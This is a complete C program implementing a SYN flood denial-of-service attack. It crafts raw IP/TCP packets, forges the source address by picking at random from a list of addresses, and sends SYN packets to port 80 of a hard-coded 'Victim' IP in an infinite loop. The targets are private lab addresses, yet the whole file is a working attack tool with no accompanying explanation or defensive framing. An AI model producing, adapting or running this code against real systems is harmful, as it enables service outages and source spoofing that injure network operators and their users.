#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0, result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

struct pseudo_header {
    unsigned int src, dst;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_len;
};

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("socket error");
        return 1;
    }

    char packet[4096];
    struct iphdr *iph = (struct iphdr*) packet;
    struct tcphdr *tcph = (struct tcphdr*) (packet + sizeof(struct iphdr));
    struct sockaddr_in dest;

    // Victim
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("10.0.0.2");   // Victim IP

    // Spoofed agent IPs
    char *spoofed_ips[] = {
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5",
        "10.0.0.6"
    };

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    printf("Starting SYN flood towards 10.0.0.2...\n");

    while (1) {
        memset(packet, 0, 4096);

        // Select random spoofed source
        char *src_ip = spoofed_ips[rand() % 4];

        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand() % 65535);
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = inet_addr(src_ip);       // spoofed IP
        iph->daddr = dest.sin_addr.s_addr;

        // TCP Header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(80);
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5;     // TCP header size
        tcph->syn = 1;      // SYN flag
        tcph->window = htons(65535);

        // Pseudo header for checksum
        struct pseudo_header psh;
        psh.src = iph->saddr;
        psh.dst = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_len = htons(sizeof(struct tcphdr));

        char pseudo_pkt[4096];
        memcpy(pseudo_pkt, &psh, sizeof(psh));
        memcpy(pseudo_pkt + sizeof(psh), tcph, sizeof(struct tcphdr));

        // Checksums
        tcph->check = checksum(pseudo_pkt, sizeof(psh) + sizeof(struct tcphdr));
        iph->check = checksum(packet, sizeof(struct iphdr));

        // Send the packet
        if (sendto(sock, packet, ntohs(iph->tot_len), 0,
                   (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            perror("sendto");
        }
    }

    close(sock);
    return 0;
}

